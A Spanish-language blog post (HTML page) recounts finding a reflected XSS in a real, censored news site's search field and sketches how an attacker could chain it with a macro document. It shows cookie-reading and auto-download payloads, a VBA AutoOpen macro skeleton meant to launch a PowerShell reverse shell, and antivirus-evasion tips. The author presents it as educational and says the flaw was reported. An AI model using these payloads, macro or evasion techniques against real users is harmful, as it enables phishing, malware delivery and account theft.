<!DOCTYPE html> <!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]--> <!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8"><![endif]--> <!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9"><![endif]--> <!--[if gt IE 8]><!--> <html class="no-js"><!--<![endif]--> <head> <meta charset="UTF-8"> <meta content="text/html; charset=UTF-8" http-equiv="Content-Type"> <meta http-equiv=X-UA-Compatible content="IE=edge,chrome=1"> <title>Simple XSS reflejado en un sitio web real &#8211; c4rta</title> <meta name="description" content="Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones"> <meta name="keywords" content="XSS"> <!-- Twitter Cards --> <meta name="twitter:card" content="summary"> <meta name="twitter:image" content="http://localhost:4000/assets/img/logo8.gif"> <meta name="twitter:title" content="Simple XSS reflejado en un sitio web real"> <meta name="twitter:description" content="Te voy a enseñar como encontre una vulnerabilidad XSS reflejado en un sitio web real"> <meta name="twitter:site" content="@_c4rta_"> <meta name="twitter:creator" content="@_c4rta_"> <!-- Open Graph --> <meta property="og:locale" content="en_US"> <meta property="og:type" content="article"> <meta property="og:title" content="Simple XSS reflejado en un sitio web real"> <meta property="og:description" content="Te voy a enseñar como encontre una vulnerabilidad XSS reflejado en un sitio web real"> <meta property="og:url" content="http://localhost:4000/xxs-reflejado/"> <meta property="og:site_name" content="c4rta"> <meta property="og:image" content="http://localhost:4000/assets/img/logo8.gif"> <link rel="canonical" href="http://localhost:4000/xxs-reflejado/"> <link href="http://localhost:4000/feed.xml" type="application/atom+xml" rel="alternate" title="c4rta Feed"> <!-- Handheld --> <meta name="HandheldFriendly" content="True"> <meta name="MobileOptimized" content="320"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <!-- CSS --> <link rel="stylesheet" href="http://localhost:4000/assets/css/main.css"> <!-- JS --> <script src="http://localhost:4000/assets/js/modernizr-3.3.1.custom.min.js"></script> <!-- Favicons --> <link rel="apple-touch-icon" href="http://localhost:4000/assets/img/favicons/apple-icon-precomposed.png"> <link rel="apple-touch-icon" sizes="72x72" href="http://localhost:4000/assets/img/favicons/apple-icon-72x72.png"> <link rel="apple-touch-icon" sizes="114x114" href="http://localhost:4000/assets/img/favicons/apple-icon-114x114.png"> <link rel="apple-touch-icon" sizes="144x144" href="http://localhost:4000/assets/img/favicons/apple-icon-144x144.png"> <link rel="shortcut icon" type="image/png" href="http://localhost:4000/favicon.png" /> <link rel="shortcut icon" href="http://localhost:4000/favicon.ico" /> <!-- Background Image --> <style type="text/css">body {background-image:url(http://localhost:4000/assets/img/placeholder-big.jpg); background-repeat: no-repeat; background-size: cover; }</style> <!-- Post Feature Image --> </head> <body> <nav id="dl-menu" class="dl-menuwrapper" role="navigation"> <button class="dl-trigger">Open Menu</button> <ul class="dl-menu"> <li><a href="http://localhost:4000/">Home</a></li> <li> <a href="#">About</a> <ul class="dl-submenu"> <li> <img src="http://localhost:4000/assets/img/logo8.gif" alt="c4rta photo" class="author-photo"> <h4>c4rta</h4> <p>Soy Omar, un amante de la ciberseguridad y las radiocomunicaciones</p> </li> <li><a href="http://localhost:4000/about/"><span class="btn btn-inverse">Learn More</span></a></li> <li> <a href="http://twitter.com/_c4rta_" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-twitter-square"></i> Twitter</a> </li> <li> <a href="http://github.com/ic4rta" target="_blank" rel="noopener noreferrer"><i class="fa fa-fw fa-github"></i> Github</a> </li> </ul><!-- /.dl-submenu --> </li> <li> <a href="#">Posts</a> <ul class="dl-submenu"> <li><a href="http://localhost:4000/posts/">All Posts</a></li> <li><a href="http://localhost:4000/tags/">All Tags</a></li> </ul> </li> </ul><!-- /.dl-menu --> </nav><!-- /.dl-menuwrapper --> <!-- Header --> <header class="header" role="banner"> <div class="wrapper animated fadeIn"> <div class="content"> <div class="post-title "> <h1>Simple XSS reflejado en un sitio web real</h1> <h4>28 Jun 2023</h4> <p class="reading-time"> <i class="fa fa-clock-o"></i> Reading time ~5 minutes </p><!-- /.entry-reading-time --> <a class="btn zoombtn" href="http://localhost:4000/posts/"> <i class="fa fa-chevron-left"></i> </a> </div> <p>Te voy a enseñar como encontre una vulnerabilidad XSS reflejado en un sitio web real</p> <p class="lead"><strong>Este no es ningun writeup, pero te voy a mostrar como encontre de casualidad una vulnerabilidad <code class="language-plaintext highlighter-rouge">XSS reflejado</code> en un sitio web real, cabe recalcar que la vulnerabilidad ya la reporte, y no estoy promoviendo explotar vulnerabilidades en entornos reales, y simplemente te voy a dar la idea de algo que podria hacer alguien con malas intenciones, que este no es el caso, y espero que el tuyo tampoco</strong></p> <h2 id="xss-reflejado">XSS reflejado</h2> <p>De acuerdo a port swigger se trata de:</p> <blockquote> <p>Surge cuando una aplicación recibe datos en una solicitud HTTP e incluye esos datos en la respuesta inmediata de forma no segura</p> </blockquote> <p>Es decir que en un XSS reflejado los datos que mándamos por una petición HTTP se reflejan en la respuesta que da el servidor web hacia el cliente (navegador)</p> <p>Cómo dice OWASP:</p> <blockquote> <p>El ataque se lleva a cabo a través de un único ciclo de solicitud/respuesta.</p> </blockquote> <p>En este tipo de XSS el codigo no reside en la aplicacion web como tal y no se encuentra del lado del servidor, y regularmente un atacante puede incrustar su payload malicioso en la URL generada y enviarselo a la victima, obvio se usa ingenieria social y phishing para que sea mas creible.</p> <h2 id="identificando-el-xss">Identificando el XSS</h2> <blockquote> <p>Evidentemente voy se censurar la URL</p> </blockquote> <p><strong>¿Como me di cuenta que era un XSS?</strong></p> <p>Fue muy random, originalmente yo solo queria buscar una noticia, entonces use su barra de busqueda para encontrar lo que queria, cuando busque por un termino me di cuenta de la forma tan peculiar de la URL y como se mostraban los datos en la pagina, mira:</p> <p><img src="/assets/img/simple_xss/1.png" alt="" /></p> <p>Vean como cuando se realiza una busqueda, te manda a la ruta <code class="language-plaintext highlighter-rouge">/buscar/</code> la cual tiene un parametro de consulta el cual es la <code class="language-plaintext highlighter-rouge">q</code>, como se ve en <code class="language-plaintext highlighter-rouge">?q=c4rta</code>, asi que el parametro <code class="language-plaintext highlighter-rouge">q</code> es utilizado para especificar el termino que se quiere buscar, y del lado de la pagina web, el termino que busque se refleja en la pagina web</p> <p><img src="/assets/img/simple_xss/2.png" alt="" /></p> <p>Esto ya estaba curioso, asi que decidi mostrar el codigo fuente de la pagina cuando se realiza la busqueda, y por suerte encontre la funcion que realiza la busqueda</p> <p><img src="/assets/img/simple_xss/3_000.png" alt="" /></p> <p>Primero con:</p> <div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">searchString</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'searchtextsimple'</span><span class="p">).</span><span class="nx">value</span><span class="p">;</span>
</code></pre></div> <p>Lo que esta haciendo es crear una variable llamada <code class="language-plaintext highlighter-rouge">searchString</code> la cual va a contener el valor del atributo <code class="language-plaintext highlighter-rouge">value</code> del elemento con el id <code class="language-plaintext highlighter-rouge">searchtextsimple</code>, y ese elemento con el id es este:</p> <div class="language-html highlighter-rouge"><pre class="highlight"><code><span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">"searchtextsimple"</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">name=</span><span class="s">"q"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">placeholder=</span><span class="s">"Buscar"</span> <span class="na">value=</span><span class="s">"c4rta"</span><span class="nt">&gt;&lt;/input&gt;</span>
</code></pre></div> <p>Despues en el JS tenemos que nuestro input el cual esta guardado en <code class="language-plaintext highlighter-rouge">searchString</code> se le concatena sin ningun tipo de procesamiento ni sanitizacion a la URL a tra vez del parametro <code class="language-plaintext highlighter-rouge">q</code>:</p> <div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="s2">"https://&lt;URL&gt;/barebone/wf.template/config.default.master.withgroupcount?q="</span> <span class="o">+</span> <span class="nb">encodeURI</span><span class="p">(</span><span class="nx">searchString</span><span class="p">);</span>
</code></pre></div> <p>Y por ultimo carga la URL para mostrarla en la web:</p> <div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="nx">$</span><span class="p">(</span><span class="s2">".results-group.parent"</span><span class="p">).</span><span class="nx">load</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
</code></pre></div> <p>Entonces tenemos que nuestro input se guarda en al atributo <code class="language-plaintext highlighter-rouge">value</code> de la etiqueta <code class="language-plaintext highlighter-rouge">&lt;input&gt;</code> y despues se extrae y se concatena directamente en la URL para luego ser interpretado por el sitio web, la vulnerabilidad es obvia, al yo tener control total de lo que quiero buscar y este sera interpretado, entonces puedo probar por XSS a ver si interpreta codigo de JS, ahora le ingresare esto como input:</p> <div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s2">"Prueba XSS"</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div> <p>Y vean como si nos interpreta el JS y ya nos dimos cuenta que tenemos un XSS reflejado</p> <p><img src="/assets/img/simple_xss/4.png" alt="" /></p> <p>Y en la URL se incrusto el codigo de XSS</p> <p><img src="/assets/img/simple_xss/5.png" alt="" /></p> <p>Podria usar otro payload para obtener las cookies, y curiosamente este sitio web tiene un monton</p> <div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div> <center><img src="/assets/img/simple_xss/6.png" width="290px" height="200px" /></center> <p><br /></p> <p>Evidentemente censure todo por que sale mi cookie de sesion asi como otras muchas, y es posible que hayas pensado que este XSS una vez teniendo la cookie de sesion podria conducir a un CSRF/XSRF, y es correcto mientras sea vulnerable a ello. pero este vez vamos a ir mas alla, por que este XSS lo vamos combinar con malware, mas en concreto algo que se le conoce como <code class="language-plaintext highlighter-rouge">MalDoc</code></p> <h2 id="maldoc">MalDoc</h2> <p>MalDoc viene de Malicious Document, y lo que podria hacer ahora es crear una macro en VBS la cual vamos a incrustar en un docx, donde la macro se ejecutara automaticamente al abrirse el documento, y vamos a aprovechar el XSS para crear un payload que al entrar a la URL vulnerable a XSS, se descargue automaticamente el documento de una URL creada por el atacante, el payload es el siguiente:</p> <div class="language-js highlighter-rouge"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span> 
    <span class="kd">var</span> <span class="nx">link</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">'a'</span><span class="p">);</span>
    <span class="nx">link</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="s1">'URL:8080/MalDoc.docx'</span><span class="p">;</span>
    <span class="nx">link</span><span class="p">.</span><span class="nx">download</span> <span class="o">=</span> <span class="s1">'MalDoc.docx'</span><span class="p">;</span>
    <span class="nx">link</span><span class="p">.</span><span class="nx">click</span><span class="p">();</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></code></pre></div> <p>Basicamente el escenario seria que nosotros como atacantes le mandemos a la victima la URL del sitio vulnerable con el payload, la victima abra la URL, se descargue automaticamente el docx, se redireccione al sitio original de la pagina vulnerable, la victima abra el documento que contiene una macro, la macro se ejecute y ejecuta un comando que podria ser una reverse shell</p> <p>Esto pasaria si la victima abre el link con el payload:</p> <p><img src="/assets/img/simple_xss/7.png" alt="" /></p> <p>Vean como la URL tiene el payload, y el entrar al link, se descargar automaticamente el documento del sitio web del atacante, en este caso, es un servidor web que cree con python y que tiene mi IPv4.</p> <p>Y entonces al abrirlo se deberia de ejecutar la macro con la reverse shell, pero ¿Como se crea la macro?, bueno, el msfvenom ya tiene modulos para crear un MalDoc y una macro maliciosa, pero estamos aprendiendo, hay que hacerlo manual, simplemente de voy a dar la idea, no lo voy a poner a prueba.</p> <p>Podriamos crear un archivo VBS de esta manera:</p> <div class="language-vb highlighter-rouge"><pre class="highlight"><code><span class="k">Sub</span> <span class="nf">AutoOpen</span><span class="p">()</span>
<span class="n">Comando_Ps</span> <span class="o">=</span> <span class="s">"el tipico oneliner de powershell"</span>

<span class="k">Dim</span> <span class="nv">Shell</span> <span class="ow">As</span> <span class="kt">Object</span>
<span class="k">Set</span> <span class="n">Shell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Wscript.Shell"</span><span class="p">)</span>
<span class="n">Shell</span><span class="p">.</span><span class="n">Run</span> <span class="p">(</span><span class="n">Comando_Ps</span><span class="p">)</span>

<span class="k">End</span> <span class="k">Sub</span>
</code></pre></div> <p>Basicamente lo que va a hacer es ejecutar un comando de powershell que se declare en la variable <code class="language-plaintext highlighter-rouge">Comando_Ps</code> a tra vez de un objeto <code class="language-plaintext highlighter-rouge">Wscript.Shell</code></p> <p>Y ahora para incrustarla en el docuemento se puede hacer uso de <code class="language-plaintext highlighter-rouge">Microsoft Visual Basic for Applications</code> y guardar el documento con la macro.</p> <p>Y seguramente diras: “Eso no evade ningun antivirus, y el defender lo va a detectar”, y en efecto, asi que te dare unos tips</p> <ul> <li>Usa Invoke-Obfuscation</li> <li>Usa procesos VMI</li> <li>Usa StrRerverse() para agregar un poco mas de ofuscacion</li> <li>Usa WMI Win32_PingStatus para evadir sandboxes</li> </ul> <p>(Estas tecnicas que acabe de mencionar, como lo de MalDoc con la macro y las tecnicas para evadir antivirus pienso dedicarles un post aparte)</p> <blockquote> <p>Recuerda que la vulnerabilidad ya esta reportada, y no estoy promoviendo la creacion de malware ni tampoco el explotar vulnerabilidades sin el permisos de otros, es meramente educativo e informativo.</p> </blockquote> <p>Eso ha sido todo, gracias por leer ❤</p> <p><img src="/assets/img/simple_xss/waifu.gif" alt="" /></p> <div class="entry-meta"> <br> <hr> <span class="entry-tags"><a href="http://localhost:4000/tags/#XSS" title="Pages tagged XSS" class="tag"><span class="term">XSS</span></a></span> <span class="social-share"> <a href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:4000/xxs-reflejado/" title="Share on Facebook" class="tag"> <span class="term"><i class="fa fa-facebook-square"></i> Share</span> </a> <a href="https://twitter.com/intent/tweet?text=http://localhost:4000/xxs-reflejado/" title="Share on Twitter" class="tag"> <span class="term"><i class="fa fa-twitter-square"></i> Tweet</span> </a> <a href="https://plus.google.com/share?url=http://localhost:4000/xxs-reflejado/" title="Share on Google+" class="tag"> <span class="term"><i class="fa fa-google-plus-square"></i> +1</span> </a> </span> <div style="clear:both"></div> </div> </div> </div> <!----> <section id="utterances_thread" class="animated fadeInUp"> <!-- <script src="https://giscus.app/client.js" data-repo="ic4rta/ic4rta.github.io" data-repo-id="R_kgDOIyhU8A" data-category="Publicaciones" data-category-id="DIC_kwDOIyhU8M4CWjpB" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="light" data-lang="en" crossorigin="anonymous" async> </script> --> <script src="https://utteranc.es/client.js" repo="ic4rta/ic4rta.github.io" issue-term="pathname" label="Publicaciones" theme="github-light" crossorigin="anonymous" async> </script> </section> </header> <!-- JS --> <script src="http://localhost:4000/assets/js/jquery-1.12.0.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.dlmenu.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.goup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.magnific-popup.min.js"></script> <script src="http://localhost:4000/assets/js/jquery.fitvid.min.js"></script> <script src="http://localhost:4000/assets/js/scripts.js"></script> <script type="text/javascript"> var disqus_shortname = 'https-ic4rta-github-io'; (function() { var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true; dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js'; (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq); })(); (function () { var s = document.createElement('script'); s.async = true; s.type = 'text/javascript'; s.src = '//' + disqus_shortname + '.disqus.com/count.js'; (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s); }()); </script> <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript> <!-- MathJax --> <script async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script> </body> </html>
